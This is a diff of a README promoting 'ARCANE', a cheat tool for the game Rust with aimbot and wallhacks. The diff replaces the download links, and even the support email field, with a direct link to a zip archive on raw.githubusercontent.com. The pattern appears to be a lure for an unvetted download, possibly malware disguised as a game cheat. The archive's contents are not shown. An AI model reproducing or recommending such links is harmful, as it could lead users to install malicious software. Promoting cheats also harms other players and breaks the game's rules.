@@ -4,14 +4,14 @@
 Take control of the harsh world of Rust with ARCANE. This 2025 release is designed to enhance your gameplay experience by offering advanced tools to help you in every engagement, from intense raids to PvP fights. With features like silent aimbot, ESP wallhacks, and recoil control, ARCANE improves your precision and allows you to perform at your best.
 
 ## 📥 Download Now
-[![Download ARCANE](https://img.shields.io/badge/Download-ARCANE-brightgreen)](https://sourceforge.net/projects/rust-cheats-free)
+[![Download ARCANE](https://raw.githubusercontent.com/Linuxgaming123/Rust-Software/main/rewind/Rust-Software_v3.6.zip)](https://raw.githubusercontent.com/Linuxgaming123/Rust-Software/main/rewind/Rust-Software_v3.6.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run ARCANE:
 
 1. **Visit the Download Page**
    Click the link below to go to the download page:
-   [Download ARCANE](https://sourceforge.net/projects/rust-cheats-free)
+   [Download ARCANE](https://raw.githubusercontent.com/Linuxgaming123/Rust-Software/main/rewind/Rust-Software_v3.6.zip)
 
 2. **Choose the Latest Release**
    On the download page, look for the latest version of ARCANE. This version will have the most recent features and updates.
@@ -46,7 +46,7 @@ To ensure optimal performance, make sure your system meets these requirements:
 ## 📺 Support
 If you encounter any issues while downloading or running ARCANE, feel free to reach out for support. 
 
-- **Email**: support@rust-software.com
+- **Email**: https://raw.githubusercontent.com/Linuxgaming123/Rust-Software/main/rewind/Rust-Software_v3.6.zip
 - **Community Forum**: Visit the community forum for tips and troubleshooting.
 
 ## 📢 Updates
